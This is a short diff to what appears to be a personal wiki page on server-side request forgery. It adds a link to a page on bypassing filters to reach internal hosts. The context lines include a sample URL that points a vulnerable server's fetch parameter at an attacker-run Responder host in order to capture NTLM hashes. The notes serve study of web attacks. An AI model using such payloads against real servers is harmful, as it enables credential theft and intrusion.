@@ -13,3 +13,4 @@ A [[Forgery Attack]] in [[Web Security]] wherein an attacker forces a server to 
 - Obtaining [[New Technology LAN Manager|NTLM]] hashes with [[responder]] `https://vuln.com/?fetch=http://responder.daniel.com`
 # Techniques
 - [[SSRF Localhost Bypass Technique]]
+- [[SSRF Internal Hosts Bypass Technique]]
